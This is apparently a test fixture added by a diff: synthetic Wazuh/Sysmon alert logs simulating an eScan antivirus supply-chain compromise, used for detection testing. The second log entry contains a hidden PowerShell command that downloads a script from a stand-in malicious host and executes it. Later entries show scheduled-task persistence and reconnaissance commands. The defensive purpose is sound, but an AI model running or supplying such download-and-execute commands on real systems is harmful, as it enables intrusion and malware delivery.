@@ -1,0 +1,386 @@
+{
+  "_metadata": {
+    "attack_id": "T1195.002",
+    "variation": "001",
+    "name": "eScan Antivirus Supply Chain Attack",
+    "description": "eScan AV update mechanism hijacked to deliver malware via reload.exe and CONSCTLX.exe",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "initial-access",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "eScan update downloads malicious reload.exe",
+      "sequence": 1,
+      "timestamp": "2026-02-03T14:00:00.000Z",
+      "log": {
+        "timestamp": "2026-02-03T14:00:00.000+0000",
+        "rule": {
+          "level": 15,
+          "description": "Sysmon - Event 1: Malicious reload.exe executed",
+          "id": "100916",
+          "mitre": {
+            "id": [
+              "T1195.002"
+            ],
+            "tactic": [
+              "Initial Access"
+            ],
+            "technique": [
+              "Compromise Software Supply Chain"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": true,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows",
+            "supply_chain",
+            "malware"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707022800.400001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-03 14:00:00.000",
+              "processGuid": "{12345678-1234-1234-1234-123456789700}",
+              "processId": "6000",
+              "image": "C:\\Program Files\\eScan\\reload.exe",
+              "commandLine": "\"C:\\Program Files\\eScan\\reload.exe\"",
+              "currentDirectory": "C:\\Program Files\\eScan\\",
+              "user": "NT AUTHORITY\\SYSTEM",
+              "integrityLevel": "System",
+              "hashes": "SHA256=8f2fe9dc184ba209f78d1b81f87f7d39f0d260b8d6dc1f7af9f256071d8c9fe0",
+              "parentProcessGuid": "{PARENT-GUID}",
+              "parentProcessId": "1234",
+              "parentImage": "C:\\Program Files\\eScan\\eserv.exe",
+              "parentCommandLine": "\"C:\\Program Files\\eScan\\eserv.exe\" -service"
+            }
+          }
+        },
+        "_fomorian_batch": "escan-supply-chain-2026-02-03",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1195.002",
+        "_fomorian_technique": "escan-reload-exe"
+      }
+    },
+    {
+      "_comment": "eScan process spawns PowerShell",
+      "sequence": 2,
+      "timestamp": "2026-02-03T14:01:00.000Z",
+      "log": {
+        "timestamp": "2026-02-03T14:01:00.000+0000",
+        "rule": {
+          "level": 15,
+          "description": "Sysmon - Event 1: eScan spawns PowerShell",
+          "id": "100916",
+          "mitre": {
+            "id": [
+              "T1059.001"
+            ],
+            "tactic": [
+              "Execution"
+            ],
+            "technique": [
+              "PowerShell"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": true,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows",
+            "powershell",
+            "supply_chain"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707022860.400002",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-03 14:01:00.000",
+              "processGuid": "{12345678-1234-1234-1234-123456789701}",
+              "processId": "6100",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell.exe -ep bypass -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://malicious.com/stage2.ps1')\"",
+              "currentDirectory": "C:\\Program Files\\eScan\\",
+              "user": "NT AUTHORITY\\SYSTEM",
+              "integrityLevel": "System",
+              "parentProcessGuid": "{12345678-1234-1234-1234-123456789700}",
+              "parentProcessId": "6000",
+              "parentImage": "C:\\Program Files\\eScan\\eserv.exe",
+              "parentCommandLine": "\"C:\\Program Files\\eScan\\eserv.exe\" -service"
+            }
+          }
+        },
+        "_fomorian_batch": "escan-supply-chain-2026-02-03",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1059.001",
+        "_fomorian_technique": "escan-spawns-powershell"
+      }
+    },
+    {
+      "_comment": "CONSCTLX.exe malicious binary execution",
+      "sequence": 3,
+      "timestamp": "2026-02-03T14:02:00.000Z",
+      "log": {
+        "timestamp": "2026-02-03T14:02:00.000+0000",
+        "rule": {
+          "level": 15,
+          "description": "Sysmon - Event 1: Malicious CONSCTLX.exe executed",
+          "id": "100916",
+          "mitre": {
+            "id": [
+              "T1195.002"
+            ],
+            "tactic": [
+              "Initial Access"
+            ],
+            "technique": [
+              "Compromise Software Supply Chain"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": true,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows",
+            "supply_chain",
+            "malware"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707022920.400003",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-03 14:02:00.000",
+              "processGuid": "{12345678-1234-1234-1234-123456789702}",
+              "processId": "6200",
+              "image": "C:\\Program Files\\eScan\\CONSCTLX.exe",
+              "commandLine": "\"C:\\Program Files\\eScan\\CONSCTLX.exe\" /silent",
+              "currentDirectory": "C:\\Program Files\\eScan\\",
+              "user": "NT AUTHORITY\\SYSTEM",
+              "integrityLevel": "System",
+              "hashes": "SHA256=bec369597633eac7cc27a698288e4ae8d12bdd9b01946e73a28e1423b17252b1",
+              "parentProcessGuid": "{12345678-1234-1234-1234-123456789700}",
+              "parentProcessId": "6000",
+              "parentImage": "C:\\Program Files\\eScan\\reload.exe",
+              "parentCommandLine": "\"C:\\Program Files\\eScan\\reload.exe\""
+            }
+          }
+        },
+        "_fomorian_batch": "escan-supply-chain-2026-02-03",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1195.002",
+        "_fomorian_technique": "escan-consctlx-exe"
+      }
+    },
+    {
+      "_comment": "eScan creates scheduled task for persistence",
+      "sequence": 4,
+      "timestamp": "2026-02-03T14:03:00.000Z",
+      "log": {
+        "timestamp": "2026-02-03T14:03:00.000+0000",
+        "rule": {
+          "level": 14,
+          "description": "Sysmon - Event 1: eScan creates scheduled task",
+          "id": "100916",
+          "mitre": {
+            "id": [
+              "T1053.005"
+            ],
+            "tactic": [
+              "Persistence"
+            ],
+            "technique": [
+              "Scheduled Task"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": true,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows",
+            "persistence",
+            "supply_chain"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707022980.400004",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-03 14:03:00.000",
+              "processGuid": "{12345678-1234-1234-1234-123456789703}",
+              "processId": "6300",
+              "image": "C:\\Windows\\System32\\schtasks.exe",
+              "commandLine": "schtasks /create /tn \"eScanUpdate\" /tr \"C:\\Program Files\\eScan\\CONSCTLX.exe\" /sc daily /st 03:00 /ru SYSTEM",
+              "currentDirectory": "C:\\Program Files\\eScan\\",
+              "user": "NT AUTHORITY\\SYSTEM",
+              "integrityLevel": "System",
+              "parentProcessGuid": "{12345678-1234-1234-1234-123456789700}",
+              "parentProcessId": "6000",
+              "parentImage": "C:\\Program Files\\eScan\\eserv.exe",
+              "parentCommandLine": "\"C:\\Program Files\\eScan\\eserv.exe\" -service"
+            }
+          }
+        },
+        "_fomorian_batch": "escan-supply-chain-2026-02-03",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1053.005",
+        "_fomorian_technique": "escan-schtask-persistence"
+      }
+    },
+    {
+      "_comment": "eScan spawns cmd.exe for lateral commands",
+      "sequence": 5,
+      "timestamp": "2026-02-03T14:04:00.000Z",
+      "log": {
+        "timestamp": "2026-02-03T14:04:00.000+0000",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: eScan spawns cmd.exe",
+          "id": "100916",
+          "mitre": {
+            "id": [
+              "T1059.003"
+            ],
+            "tactic": [
+              "Execution"
+            ],
+            "technique": [
+              "Windows Command Shell"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows",
+            "execution",
+            "supply_chain"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707023040.400005",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-03 14:04:00.000",
+              "processGuid": "{12345678-1234-1234-1234-123456789704}",
+              "processId": "6400",
+              "image": "C:\\Windows\\System32\\cmd.exe",
+              "commandLine": "cmd.exe /c whoami && ipconfig /all",
+              "currentDirectory": "C:\\Program Files\\eScan\\",
+              "user": "NT AUTHORITY\\SYSTEM",
+              "integrityLevel": "System",
+              "parentProcessGuid": "{12345678-1234-1234-1234-123456789702}",
+              "parentProcessId": "6200",
+              "parentImage": "C:\\Program Files\\eScan\\CONSCTLX.exe",
+              "parentCommandLine": "\"C:\\Program Files\\eScan\\CONSCTLX.exe\" /silent"
+            }
+          }
+        },
+        "_fomorian_batch": "escan-supply-chain-2026-02-03",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1059.003",
+        "_fomorian_technique": "escan-spawns-cmd"
+      }
+    }
+  ]
+}
